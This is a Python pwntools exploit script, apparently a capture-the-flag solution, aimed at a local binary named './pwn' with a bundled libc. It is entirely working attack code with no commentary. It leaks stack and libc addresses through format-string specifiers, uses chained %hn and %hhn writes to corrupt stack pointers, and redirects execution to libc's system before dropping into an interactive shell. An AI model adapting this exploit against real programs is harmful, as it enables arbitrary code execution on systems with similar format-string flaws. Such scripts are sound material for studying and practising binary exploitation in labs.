#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"

io = process('./pwn')
libc = ELF('./libc.so.6')

def snd(*msg):
    io.send(flat(msg).ljust(0x1000, b'\x00'))

io.send(b'%6$p-%7$p')

io.recvuntil(b'0x')
empty_stack = int(io.recv(12), 16) - 0x28

io.recvuntil(b'0x')
base = int(io.recv(12),16) - 0x2a1ca

snd(f"%{empty_stack & 0xffff}c", "%9$hn")
snd("%43$hhn")
snd(f"%{(empty_stack & 0xffff) + 1}c", "%9$hn")
snd("%64c%43$hhn")
snd(f"%{(empty_stack & 0xffff) + 2}c", "%9$hn")
snd("%64c%43$hhn")

system = base + libc.sym.system

empty_stack += 8

snd(f"%{empty_stack & 0xffff}c", "%9$hn")
snd("%1c%43$hhn")
snd(f"%{(empty_stack & 0xffff) + 1}c", "%9$hn")
snd("%64c%43$hhn")
snd(f"%{(empty_stack & 0xffff) + 2}c", "%9$hn")
snd("%64c%43$hhn")

t1 = (system >> 0) & 0xff
t2 = (system >> 8) & 0xffff
io.send(
    f"%{t1}c%21$hhn" + f"%{t2 - t1}c%22$hn"
)

io.interactive()